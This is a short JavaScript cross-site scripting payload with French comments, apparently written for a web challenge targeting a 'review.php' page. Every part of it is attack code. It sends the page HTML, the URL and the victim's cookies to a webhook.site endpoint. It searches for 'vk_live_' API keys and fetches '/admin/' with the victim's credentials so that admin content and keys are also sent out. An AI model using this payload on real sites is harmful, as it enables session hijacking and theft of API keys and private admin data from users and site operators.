// === CONFIGURATION ===
const WEBHOOK = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";

// === FONCTION D'EXFILTRATION ===
function exfil(data) {
    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
}

// === RÉCUPÉRATION DES DONNÉES ===
// 1. Page actuelle (review.php)
const html = document.documentElement.outerHTML;
exfil("URL: " + location.href + "\n\n--- PAGE HTML ---\n" + html);

// 2. Recherche de l'API key dans la page
const keyMatch = html.match(/vk_live_[a-f0-9]{40}/);
if (keyMatch) {
    exfil("🚨 API KEY TROUVÉE: " + keyMatch[0]);
}

// 3. Cookies
exfil("🍪 COOKIES: " + document.cookie);

// 4. Tentative de fetch vers /admin/
fetch('/admin/', { credentials: 'include' })
    .then(r => r.text())
    .then(adminHtml => {
        const adminKey = adminHtml.match(/vk_live_[a-f0-9]{40}/);
        if (adminKey) {
            exfil("🚨 ADMIN API KEY: " + adminKey[0]);
        }
        exfil("--- /admin/ HTML ---\n" + adminHtml.substring(0, 2000));
    })
    .catch(e => exfil("❌ Erreur fetch /admin/: " + e.message));
